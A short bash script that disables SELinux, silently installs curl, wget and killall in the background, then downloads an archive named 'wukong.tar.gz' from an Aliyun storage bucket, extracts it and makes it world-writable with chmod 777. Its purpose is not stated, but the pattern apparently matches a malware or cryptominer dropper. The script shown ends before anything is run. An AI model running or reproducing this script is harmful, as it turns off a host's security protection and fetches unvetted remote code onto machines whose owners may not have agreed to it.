#!/bin/bash

curr_dir=$(cd `dirname $0`; pwd)


check(){
        disable_selinux
        install_curl_wget
}

install_curl_wget(){
    if [[ -f /etc/redhat-release ]]; then
        release="centos"
        systemPackage="yum"
        elif cat /etc/issue | grep -Eqi "ubuntu"; then
        release="ubuntu"
        systemPackage="apt"
        fi
        if [ "$release" == "centos" ]; then
                if ! command -v curl > /dev/null;then 
                echo "centos"
                yum -y install curl >/dev/null 2>&1 &
		sleep 10
                fi
                if ! command -v wget > /dev/null;then 
                yum -y install wget >/dev/null 2>&1 &
		sleep 10
                fi
		if ! command -v killall > /dev/null;then
                yum -y install psmisc >/dev/null 2>&1 &
                sleep 10
                fi
        elif  [ "$release" == "ubuntu" ];then
                if ! command -v curl > /dev/null;then
                echo "ubuntu"
                apt -y install curl >/dev/null 2>&1 &
		sleep 10
                fi
                if ! command -v wget > /dev/null;then
                apt -y install wget >/dev/null 2>&1 &
		sleep 10
                fi
		if ! command -v killall > /dev/null;then
                apt -y install psmisc >/dev/null 2>&1 &
                sleep 10
                fi
        fi
}

disable_selinux(){
if [ -s /etc/selinux/config ] && grep 'SELINUX=enforcing' /etc/selinux/config; then
    sed -i 's/SELINUX=enforcing/SELINUX=disabled/g' /etc/selinux/config
    setenforce 0
fi
}

check

file_link='https://wukong31883.oss-cn-beijing.aliyuncs.com/wukong.tar.gz'
file_name=`echo  $file_link|awk -F '/' '{print $4}'`
file_name_dir=`echo  $file_name|awk -F '.' '{print $1}'`
down=`wget -c "$file_link"`
down_check=`tar zxvf $file_name -C . && chmod -R 777 $file_name_dir && cd $file_name_dir`

